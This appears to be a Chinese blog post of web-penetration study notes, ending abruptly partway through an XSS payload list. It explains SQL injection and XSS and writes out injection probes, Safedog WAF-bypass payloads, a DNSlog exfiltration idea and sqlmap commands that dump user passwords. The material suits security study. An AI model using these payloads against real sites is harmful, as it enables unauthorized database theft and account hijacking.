+<h3 id="①对象"><a href="#①对象" class="headerlink" title="①对象"></a>①对象</h3><h4 id="1、CMS"><a href="#1、CMS" class="headerlink" title="1、CMS"></a>1、CMS</h4><p>内容管理系统，用于快速统一创建网站。许多使用CMS构建的网站均存在着对应的漏洞。比如，WordPress 是著名的个人网站CMS，之前我们进行靶场的攻打的时候发现它存在着不少可以被利用来提权的漏洞。</p>
+<blockquote>
+<p>常见的CMS网站平台有：</p>
+<ul>
+<li>WordPress</li>
+<li>HubSpot</li>
+<li>Joomla</li>
+<li>WooCommerce</li>
+<li>Drupal</li>
+<li>Wix</li>
+<li>BigCommerce</li>
+<li>Shopify</li>
+<li>ghost</li>
+<li>Magento</li>
+<li>Textpattern</li>
+<li>Blogger</li>
+<li>Bitrix24</li>
+<li>TYPO3</li>
+</ul>
+</blockquote>
+<p>可以通过<code>metasploit</code>、<code>searchsploit</code>等来搜索有关特定CMS平台的漏洞并尝试进行利用。</p>
+<h4 id="2、中间件"><a href="#2、中间件" class="headerlink" title="2、中间件"></a>2、中间件</h4><p>中间件是一种独立的系统软件或服务程序，位于客户机&#x2F;服务器的操作系统之上，管理计算机资源和网络通讯，是连接两个独立应用程序或独立系统的软件。</p>
+<p>常见的中间件有：<code>IIS、apache、ngnix、weblogic等</code>。</p>
+<p>中间件本身并不能用来Getshell或提权。而且其一般不是以root用户启动的。但是，在特定条件下（比如存在一些安全漏洞）可以被利用来实施攻击。</p>
+<blockquote>
+<p>常见的三种架构：</p>
+<ul>
+<li>ASP &#x3D; windows + IIS + SQL Server&#x2F;Access + ASP</li>
+<li>J2EE &#x3D; UNIX + Tomcat + Oracle + JSP</li>
+<li>LAMP &#x3D; Linux + Apache + MySql + php</li>
+</ul>
+</blockquote>
+<h4 id="3、后门"><a href="#3、后门" class="headerlink" title="3、后门"></a>3、后门</h4><p>后门是指黑客为了对主机进行长期的控制，在机器上种植的一段程序或留下的一个“入口”。</p>
+<p>如何检测机器上的后门，主要是通过后门扫描工具来进行。比如，BackdoorBox、</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/356576.html">常见系统后门技术总结与分析利用</a></p>
+<p>一般来说，我们可以通过植入后门对目标主机进行监控。具体的就先不深入探究了。</p>
+<h4 id="4、webshell"><a href="#4、webshell" class="headerlink" title="4、webshell"></a>4、webshell</h4><p>指网站后门。它通过web服务进行命令执行。</p>
+<h3 id="②目标"><a href="#②目标" class="headerlink" title="②目标"></a>②目标</h3><h4 id="1、Getshell"><a href="#1、Getshell" class="headerlink" title="1、Getshell"></a>1、Getshell</h4><p>即<code>获取目标的命令执行权限</code>。</p>
+<blockquote>
+<p>shell，简单来说就是“为使用者提供操作页面”的命令解释器。</p>
+</blockquote>
+<h4 id="2、提权"><a href="#2、提权" class="headerlink" title="2、提权"></a>2、提权</h4><p>操作系统低权限的账户将自己提升为管理员权限使用的方法。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfsec/p/15163907.html">linux提权总结</a></p>
+<h4 id="3、相关术语"><a href="#3、相关术语" class="headerlink" title="3、相关术语"></a>3、相关术语</h4><blockquote>
+<ul>
+<li>肉鸡：被黑客入侵并被长期驻扎的计算机或服务器。可以随意控制，可以是任意系统的设备，对象可以是企业，个人，政府等等所有单位。</li>
+<li>抓鸡：利用程序的漏洞，使用自动化方式获取存在漏洞的行为。</li>
+<li>撞库：撞库是黑客通过收集互联网已泄露的用户和密码信息，生成对应的字典表，尝试批量登陆其他网站后，得到一系列可以登录的用户。</li>
+<li>拖库：拖库本来是数据库领域的术语，指从数据库中导出数据。到了黑客攻击泛滥的今天，它被用来指网站遭到入侵后，黑客窃取其数据库。</li>
+<li>POC：全称”Proof of Concept”（ 概念验证），常指一段漏洞证明的代码。</li>
+<li>EXP：全称”Exploit”（利用），指利用系统漏洞进行攻击的动作。</li>
+<li>Payload：“有效载荷”，指成功exploit之后，真正在目标系统执行的代码&#x2F;指令。</li>
+<li>ShellCode：“shell代码”，是Payload的一种，因其建立正向&#x2F;反向shell而得名。</li>
+<li>APT攻击：Advanced Persistent Threat ，高级可持续性攻击，是指组织或者小团体利用先进的攻击手段对特定目标进行长期持续性网络攻击的攻击形式。（具有极强的隐蔽性、潜伏期长、持续性强、目标性强）。</li>
+</ul>
+</blockquote>
+<h2 id="基础漏洞"><a href="#基础漏洞" class="headerlink" title="基础漏洞"></a>基础漏洞</h2><h3 id="①SQL注入"><a href="#①SQL注入" class="headerlink" title="①SQL注入"></a>①SQL注入</h3><blockquote>
+<p>SQL注入攻击（SQL injection），简称注入攻击，是发生于应用程序之数据库层的安全漏洞。简而言之，是在输入的字符串之中注入SQL指令，当设计不良的程序忽略了检查，那么这些注入进去的指令就会被数据库服务器误认为是正常的SQL指令而运行，因此遭到攻击。</p>
+</blockquote>
+<h4 id="1、先验知识"><a href="#1、先验知识" class="headerlink" title="1、先验知识"></a>1、先验知识</h4><ul>
+<li><h5 id="Mysql的三种注释风格："><a href="#Mysql的三种注释风格：" class="headerlink" title="Mysql的三种注释风格："></a>Mysql的三种注释风格：</h5></li>
+</ul>
+<blockquote>
+<p>单行注释：<code>#</code>后面直接添加注释内容</p>
+<p>​			  <code>--</code>后面直接添加注释内容</p>
+<p>多行注释：<code>/*中间可跨行*/</code>于中间添加注释内容</p>
+<p>内联注释：MySql为了保持于其它数据库兼容，避免从mysql中导出的sql语句不能被其它数据库使用。它将mysql中特有的语句放在了<code>/*！content*/</code>中，这些语句在不兼容的数据库中使用时便不会被执行，而mysql自身却能识别。</p>
+<p>在SQL注入中，内联注释常用来绕过waf。</p>
+</blockquote>
+<ul>
+<li><h5 id="Union联合查询："><a href="#Union联合查询：" class="headerlink" title="Union联合查询："></a>Union联合查询：</h5></li>
+</ul>
+<blockquote>
+<p>Union操作符用于拼接两个或者多select查询语句</p>
+<p>Union中的每个查询必须拥有相同的列数</p>
+</blockquote>
+<ul>
+<li><h5 id="Order-by语句："><a href="#Order-by语句：" class="headerlink" title="Order by语句："></a>Order by语句：</h5></li>
+</ul>
+<blockquote>
+<p>Order by语句用于根据指定的列对结果集进行排序</p>
+<p>默认按照升序对记录进行排序</p>
+</blockquote>
+<ul>
+<li><h5 id="SQL注入中常用的Mysql语句："><a href="#SQL注入中常用的Mysql语句：" class="headerlink" title="SQL注入中常用的Mysql语句："></a>SQL注入中常用的Mysql语句：</h5></li>
+</ul>
+<blockquote>
+<p>user()	当前用户名</p>
+<p>database()	当前所有数据库</p>
+<p>current_user()	当前用户名（可用来查看权限）</p>
+<p>version()	数据库版本</p>
+<p>@@datadir	数据库路径</p>
+<p>load_file()	读文件操作</p>
+<p>into outfile() &#x2F; into dumpfile()	写文件操作</p>
+</blockquote>
+<ul>
+<li><h5 id="sql注入读写文件的条件"><a href="#sql注入读写文件的条件" class="headerlink" title="sql注入读写文件的条件"></a>sql注入读写文件的条件</h5></li>
+</ul>
+<blockquote>
+<p>数据库允许导入导出（secure_file_priv）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; show variables like <span class="hljs-string">&quot;secure_file_priv&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>当前用户文件操作权限（File_priv）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql&gt; <span class="hljs-keyword">select</span> File_priv from mysql.user <span class="hljs-built_in">where</span> user=<span class="hljs-string">&#x27;root&#x27;</span> and host=<span class="hljs-string">&#x27;localhost&#x27;</span>;<br></code></pre></td></tr></table></figure>
+</blockquote>
+<ul>
+<li><h5 id="SQL注入漏洞的判断依据"><a href="#SQL注入漏洞的判断依据" class="headerlink" title="SQL注入漏洞的判断依据"></a>SQL注入漏洞的判断依据</h5></li>
+</ul>
+<blockquote>
+<p>构建测试语句</p>
+<p>提交请求</p>
+<p>分析返回结果</p>
+<p>①符合预期结果，则存在SQL注入漏洞</p>
+<p>②不符合预期结果，则可以判断为不存在SQL注入漏洞，当然也可以再次构造测试语句进行进一步的测试。</p>
+</blockquote>
+<ul>
+<li><h5 id="SQL注入漏洞的类型"><a href="#SQL注入漏洞的类型" class="headerlink" title="SQL注入漏洞的类型"></a>SQL注入漏洞的类型</h5></li>
+</ul>
+<blockquote>
+<p>通常分为两种：数字型、字符型</p>
+</blockquote>
+<h4 id="2、SQL注入技术"><a href="#2、SQL注入技术" class="headerlink" title="2、SQL注入技术"></a>2、SQL注入技术</h4><blockquote>
+<p>主要分为三种注入技术：</p>
+<ul>
+<li>基于报错注入（Error-based）</li>
+<li>基于Union联合查询注入</li>
+<li>基于盲注（Bind SQL injection）</li>
+</ul>
+</blockquote>
+<ul>
+<li><h5 id="基于报错注入（Error-based）"><a href="#基于报错注入（Error-based）" class="headerlink" title="基于报错注入（Error-based）"></a>基于报错注入（Error-based）</h5></li>
+</ul>
+<p><code>用法</code>：构造错误的SQL命令将注入信息在数据库错误信息中显示出来。</p>
+<p><code>条件</code>：需要根据不同数据库的错误处理机制以及脚本语言错误处理机制构造。</p>
+<p><code>注意</code>：有字节数限制，可将注入的字符串信息拆分显示。</p>
+<p><code>特点</code>：效率高。</p>
+<ul>
+<li><h5 id="基于Union联合查询注入"><a href="#基于Union联合查询注入" class="headerlink" title="基于Union联合查询注入"></a>基于Union联合查询注入</h5></li>
+</ul>
+<p><code>用途</code>：用于合并两个或多个select语句的结果集。</p>
+<p><code>用法</code>：<code>union select column_name(s) from table_name1</code></p>
+<p><code>注意</code>：union内部的select语句必须拥有相同数量的列，列也必须拥有相似的数据类型。默认union操作符选取不同的值。(如果允许重复的值，则使用<code>union all</code>)</p>
+<p><code>特点</code>：效率高，可一次批量查询大量数据。</p>
+<ul>
+<li><h5 id="基于盲注（Bind-SQL-injection）"><a href="#基于盲注（Bind-SQL-injection）" class="headerlink" title="基于盲注（Bind SQL injection）"></a>基于盲注（Bind SQL injection）</h5></li>
+</ul>
+<p><code>用途</code>：在无法通过显示位和错误信息获取目标数据时，根据注入语句返回的true、false的结果页面不同暴力猜解目标数据。</p>
+<p><code>用法</code>：<code>使用条件语句，如 if 、 case when等</code></p>
+<p><code>特点</code>：暴力猜解，速度慢，效率低。</p>
+<h4 id="3、SQL注入实操"><a href="#3、SQL注入实操" class="headerlink" title="3、SQL注入实操"></a>3、SQL注入实操</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/339118.html">浅谈Sql注入总结笔记整理(超详细)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/dhan/p/18290502">SQL注入基础入门-详细</a></p>
+<h5 id="判断是否存在SQL注入"><a href="#判断是否存在SQL注入" class="headerlink" title="判断是否存在SQL注入"></a>判断是否存在SQL注入</h5><blockquote>
+<p>有个注意的点：url后面必须是可注入的参数?id&#x3D;之类的，否则url检测会有问题。</p>
+</blockquote>
+<ul>
+<li><strong>单引号判断法：</strong></li>
+</ul>
+<p>在参数（通常为网页URL）后面加上单引号（英文），重新加载网页。</p>
+<blockquote>
+<p>如果页面返回错误，则表示存在SQL注入。（无论是字符型还是整型都会因为单引号个数不匹配而报错）</p>
+<p>如果未报错，也无法断定不存在SQL注入。（可能页面对单引号设置了过滤，此时可以使用判断语句进行注入）</p>
+</blockquote>
+<h5 id="SQL注入类型判断"><a href="#SQL注入类型判断" class="headerlink" title="(SQL注入类型判断)"></a>(SQL注入类型判断)</h5><ul>
+<li><strong>数字型判断</strong></li>
+</ul>
+<blockquote>
+<p>‘select * from <tablename> where id &#x3D; x’</p>
+<p>当输入的参数 x 为整型时，通常在abc.php中的这种类型可以使用经典的<code>and 1=1</code>和<code>and 1=2</code>来进行判断：</p>
+<p>url地址中输入<code>http://xxx/abc.php?id=x and 1=1</code>，若网页页面依旧运行正常，则继续执行下一步👇</p>
+<p>url地址中输入<code>http://xxx/abc.php?id=x and 1=2</code>，页面运行错误，则说明此SQL注入为数字型注入。（换言之，如果仍然正常说明不是数字型SQL注入）</p>
+</blockquote>
+<ul>
+<li><strong>字符型注入</strong></li>
+</ul>
+<blockquote>
+<p>‘select * from <tablename> where id &#x3D; x’</p>
+<p>当输入的参数 x 为字符型时，同样可以使用<code>and &#39;1&#39;=&#39;1</code>和<code>and &#39;1&#39;=&#39;2</code>来判断：</p>
+<p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;1</code>时，如果网页页面运行正常，则继续执行下一步👇</p>
+<p>url地址中输入<code>http://xxx/abc.php?id=x and &#39;1&#39;=&#39;2</code>时，页面运行错误，则说明此SQL注入为字符型注入。</p>
+</blockquote>
+<ul>
+<li><strong>sqlmap注入判断</strong></li>
+</ul>
+<p>当前面三种注入判断方法都尝试过，并且显示的界面都是正常的时候。此时我们仍无法断定其不存在SQL注入，可以再使用sqlmap进行扫描测试，如果再扫不出注入口的话，那有九成把握断定其不存在SQL注入。</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yy-123/p/16749289.html">SQLMap入门——判断是否存在注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/wuhongbin/p/15582981.html">sqlmap使用手册（更直白款）</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 检测是否存在注入</span><br>sqlmap -u url<br><br><span class="hljs-comment"># 获取所有表名</span><br>sqlmap -u url --dbs<br><br><span class="hljs-comment"># 获取当前库名</span><br>sqlmap -u url --current-db<br><br><span class="hljs-comment"># 获取当前连接数据库的用户名    </span><br>sqlmap -u url --current-user<br><br><span class="hljs-comment"># 获取指定库的所有表名 -D 指定数据库</span><br>sqlmap -u url -D security --tables<br><br><span class="hljs-comment"># 获取指定库指定表的字段名 -T 指定表名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> --columns<br><br><span class="hljs-comment"># 获取指定库指定表指定字段的数据 -C 指定字段名</span><br>sqlmap -u url -D security -T <span class="hljs-built_in">users</span> -C <span class="hljs-built_in">id</span>,username,password --dump<br><br><span class="hljs-comment"># 清除缓存进行注入 (删除sqlmap的output文件夹也可清除缓存)</span><br>sqlmap -u url --purge<br></code></pre></td></tr></table></figure>
+
+<h4 id="4、绕过安全狗（防SQL注入功能）"><a href="#4、绕过安全狗（防SQL注入功能）" class="headerlink" title="4、绕过安全狗（防SQL注入功能）"></a>4、绕过安全狗（防SQL注入功能）</h4><p>什么是安全狗？</p>
+<blockquote>
+<p>安全狗是一种网络安全服务，主要用于网站的防护和安全监测。具体来说，网站安全狗是一款集网站内容安全防护、网站资源保护及网站流量保护功能为一体的服务器工具。功能涵盖了网马&#x2F;木马扫描、防SQL注入、防盗链、防CC攻击、网站流量实时监控、网站CPU监控、下载线程保护、IP黑白名单管理、网页防篡改功能等模块。能够为用户提供实时的网站安全防护，避免各类针对网站的攻击所带来的危害。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1705861">绕安全狗的那些事</a></p>
+<p>由于安全狗是一款常用于网站安全保护的服务器工具，其包含了防SQL注入的功能。绕过安全狗的防SQL注入功能，顾名思义，便能够执行SQL注入了。</p>
+<p>那么如果绕过安全狗中的防SQL注入模块呢？</p>
+<blockquote>
+<p>一般来说，安全狗不会对POST请求做检测，如果POST请求也被拦截的话，那就可以尝试进行分块传输。</p>
+</blockquote>
+<h5 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h5><p>内联注释符：<code>/*!...*/</code></p>
+<p>绕过思路：</p>
+<p>· 首先使用常规判断注入的方法（and 1&#x3D;1 或其它）判断类型。</p>
+<p>· 如果被拦截，使用非·常规判断方法（and -1&#x3D;-1–+ 后面的<code>--+</code>是注释符）判断类型。</p>
+<p>· 如果还是被拦截，那基本可以判断为<code>安全狗一般都会拦截 and+一些组合语句 </code>，</p>
+<p>· 接下来可以使用<code>四则运算</code>判断，<code>/1返回正常页面，/0返回异常页面，则表示其为数字型注入</code>，如果是数字型注入的话，尝试使用<code>order by</code>绕过：</p>
+<blockquote>
+<p>输入：%20&#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F;%20&#x2F;<em><strong><strong>!23144by</strong></strong></em>&#x2F;%201–+</p>
+<p>%20表示空格</p>
+<p>实际显示： &#x2F;<em><strong><strong>!23144order</strong></strong></em>&#x2F; &#x2F;*****!23144by*&#x2F; 1–+</p>
+</blockquote>
+<blockquote>
+<p>字符型绕过：</p>
+<p><code>1&#39;/case when 1=1 then &#39;1&#39; else &#39;0&#39; end--+ </code></p>
+<p><code>1&#39;/case when 1=1 then 1 else 0 end--+</code></p>
+</blockquote>
+<p>· 如果被拦截了，尝试使用<code>if</code>语句：</p>
+<blockquote>
+<p>if(1&#x3D;1,1,0)</p>
+<p>if(1&#x3D;0,1,0)</p>
+</blockquote>
+<p>如果条件为真页面返回正常，注入成功，为假页面返回异常的话。那就表明if语句绕过成功了。</p>
+<p>· 先判断数据库长度：<code>if(length(database())&gt;0,1,0)</code></p>
+<p>· 若被拦截，使用字符替换其中的<code>database()</code>验证是否是该函数被拦截。<code>if(length(&#39;abc&#39;)&gt;0,1,0)</code></p>
+<p>· 若返回页面正常，则表示是其中的<code>database()</code>被拦截</p>
+<p>· 使用<code>内联绕过</code>：<code>if(length(/*!06440database*/())%3E0,1,0)</code>其中，<code>%3E</code>表示<code>&gt; </code>符号，将函数名使用内联注释符框住，执行。</p>
+<p>· 正常来说，如此便会成功绕过。（不会被拦截啦）</p>
+<p>· 之后就是执行参数污染等操作了：</p>
+<blockquote>
+<p><code>/**&amp;id=-1 union select 1,2,3#*/ </code></p>
+<p><code>/**-1 union select 1,2,3#*/ </code></p>
+<p><code>/***/</code></p>
+</blockquote>
+<h4 id="5、DNS外带SQL注入（属于mysql盲注）"><a href="#5、DNS外带SQL注入（属于mysql盲注）" class="headerlink" title="5、DNS外带SQL注入（属于mysql盲注）"></a>5、DNS外带SQL注入（属于mysql盲注）</h4><p>使用场景：无法通过联合查询直接获取数据的情况下，注入时无回显时，可尝试使用 DNSlog 外带注入。</p>
+<p>用途：用于在SQL注入攻击中绕过防火墙和安全措施，以获取更多的信息。</p>
+<p>利用条件：①DNSlog外带要用到 Load_file()函数，需要当前数据库用户有读权限。②设置 <code>secure_file_priv</code>为空。查询权限的语句为：<code>select file_priv from mysql.user where user=&#39;&#39;</code></p>
+<blockquote>
+<p>DNSlog注入的原理大致为：当我们输入域名时，会向DNS服务器解析获取IP在通过IP访问，在这过程中DNS服务器会产生对域名请求解析的日志，比如此时存在一个域名为<code>summer.com</code>，要使用的payload为<code>whoami.summer.com</code>，就可以通过DNS解析日志来获取到主机名。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/323674.html">mysql盲注之dns外带注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_48083470/article/details/119379081">DNSlog注入 信息的 带外|外带 sql注入利用详解+实操</a></p>
+<h4 id="6、sqlmap使用"><a href="#6、sqlmap使用" class="headerlink" title="6、sqlmap使用"></a>6、sqlmap使用</h4><p>先验知识：</p>
+<blockquote>
+<p>sqlmap 是一款开源的渗透测试工具，可以自动化进行SQL注入的检测、利用，并能接管数据库服务器。它具有功能强大的检测引擎,为渗透测试人员提供了许多专业的功能并且可以进行组合，其中包括数据库指纹识别、数据读取和访问底层文件系统，甚至可以通过带外数据连接的方式执行系统命令。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43819747/article/details/136736688">Sqlmap使用指南</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/dzqxwzoe/article/details/132683722">SQLmap使用教程图文教程</a></p>
+<p>常用表：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash">-a, --all           检索所有内容<br>   -b, --banner        检索DBMS横幅<br>   --current-user      检索DBMS当前用户<br>   --current-db        检索DBMS当前数据库<br>   --hostname          检索DBMS服务器主机名<br>   --is-dba            检测DBMS当前用户是否为DBA<br>   --<span class="hljs-built_in">users</span>             枚举DBMS用户<br>   --passwords         枚举DBMS用户密码哈希值<br>   --privileges        枚举DBMS用户权限<br>   --roles             枚举DBMS用户角色<br>   --dbs               枚举DBMS数据库<br>   --tables            枚举DBMS数据库表<br>   --columns           枚举DBMS数据库表列<br>   --schema            枚举DBMS模式<br>   --count             检索表的条目数<br>   --dump              转储DBMS数据库表条目<br>   --dump-all          转储所有DBMS数据库表条目<br>   --search            搜索列、表和/或数据库名称<br>   --comments          在枚举过程中检查DBMS注释<br>   --statements        检索在DBMS上运行的SQL语句<br>   -D DB               要枚举的DBMS数据库<br>   -T TBL              要枚举的DBMS数据库表<br>   -C COL              要枚举的DBMS数据库表列<br>   -X EXCLUDE          不要枚举的DBMS数据库标识符<br>   -U USER             要枚举的DBMS用户<br>   --exclude-sysdbs    在枚举表时排除DBMS系统数据库<br>   --pivot-column=P..  枢轴列名称<br>   --<span class="hljs-built_in">where</span>=DUMPWHERE   在转储表时使用WHERE条件<br>   --start=LIMITSTART  要检索的第一个转储表条目<br>   --stop=LIMITSTOP    要检索的最后一个转储表条目<br>   --first=FIRSTCHAR   要检索的第一个查询输出单词字符<br>   --last=LASTCHAR     要检索的最后一个查询输出单词字符<br>   --sql-query=SQLQ..  要执行的SQL语句<br>   --sql-shell         提示进行交互式SQL shell<br>   --sql-file=SQLFILE  从给定文件中执行SQL语句<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="②XSS跨站脚本攻击"><a href="#②XSS跨站脚本攻击" class="headerlink" title="②XSS跨站脚本攻击"></a>②XSS跨站脚本攻击</h3><h4 id="1、漏洞简介"><a href="#1、漏洞简介" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><ul>
+<li><p>XSS，跨站脚本攻击，是指恶意攻击者网<code>web页面</code>中<code>插入恶意代码</code>，当用户<code>浏览该网页时</code>，嵌入其中的恶意代码就会被执行，从而达到攻击者的目的。</p>
+</li>
+<li><p>XSS属于被动攻击。最大的特点是，能注入恶意的html&#x2F;JavaScript代码到用户浏览的网页上，从而达到的挟持用户会话的目的。</p>
+</li>
+<li><p>危害：窃取用户&#x2F;管理员的cookie非法登陆；网站挂马（将恶意木马代码插入到web页面中，用户访问页面目标计算机就会被植入木马）；发送广告或垃圾信息。</p>
+</li>
+</ul>
+<h4 id="2、漏洞类型"><a href="#2、漏洞类型" class="headerlink" title="2、漏洞类型"></a>2、漏洞类型</h4><p><strong>主要分为三种类型：</strong></p>
+<h5 id="反射类XSS（非持久型XSS）"><a href="#反射类XSS（非持久型XSS）" class="headerlink" title="反射类XSS（非持久型XSS）"></a>反射类XSS（非持久型XSS）</h5><p>攻击者需要通过<code>诱使用户点击</code>包含XSS攻击代码的恶意链接，接着用户方的浏览器就会执行恶意代码触发XSS漏洞。</p>
+<p>· 利用：常见的利用方法是在URL中构造，将恶意链接发送给目标用户。（当用户访问该链接时，其浏览器会向服务器发起一个GET请求来提交带有恶意代码的链接，在浏览器中解析）</p>
+<p>· 一般情况下，反射性XSS存在于搜索框，<code>通过URL控制页面的输出</code>。简而言之为，将参数传入服务器，再由服务器输出出来。</p>
+<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>攻击者需要事先将javascript<code>代码上传或存储</code>到存在漏洞的服务器中。当受害者浏览包含此恶意Javascript代码的页面时便会触发恶意代码。</p>
+<p>· 利用：需要将恶意代码上传至服务器中。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45842420/article/details/123450070">本地代码上传到服务器</a></p>
+<h5 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h5><p>它是一种特殊的反射型XSS。</p>
+<p>· DOM树，文档对象模型，web前端开发中常使用到的模型。</p>
+<p>· 主要由客户端的脚本程序通过DOM动态地输出数据到页面，而非依赖于将数据提交给服务器端。明白说来是，js脚本从url中获取数据并将其传递到<code>支持动态代码执行的接收器</code>时，就会产生DOM-XSS漏洞。咦？DOM-XSS一般产生于<code>用户能够进行参数输入查询的地方</code>（比如搜索框捏）。</p>
+<p>· 常见的接收器：</p>
+<blockquote>
+<p>document.write()<br>document.writeln()<br>document.domain<br>someDOMElement.innerHTML<br>someDOMElement.outerHTML<br>someDOMElement.insertAdjacentHTML<br>someDOMElement.onevent</p>
+</blockquote>
+<p>· 演示范例：<a target="_blank" rel="noopener" href="https://blog.csdn.net/vodkaDL/article/details/111570321">Web渗透测试之XSS攻击：基于DOM的XSS</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/mysticbinary/p/12542695.html">DOM-XSS攻击原理与防御</a></p>
+<h4 id="3、常用XSS语句"><a href="#3、常用XSS语句" class="headerlink" title="3、常用XSS语句"></a>3、常用XSS语句</h4><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xfbk/p/17936998">XSS注入测试思路+通用语句</a></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;script&gt;alert(<span class="hljs-string">&#x27;hello，gaga!&#x27;</span>);&lt;/script&gt; //经典语句!<br> <br>&gt;<span class="hljs-string">&quot;&#x27;&gt;&lt;img src=&quot;</span>javascript.:alert(<span class="hljs-string">&#x27;XSS&#x27;</span>)<span class="hljs-string">&quot;&gt;</span><br><span class="hljs-string"> </span><br><span class="hljs-string">&gt;&quot;</span><span class="hljs-string">&#x27;&gt;&lt;script&gt;alert(&#x27;</span>XSS<span 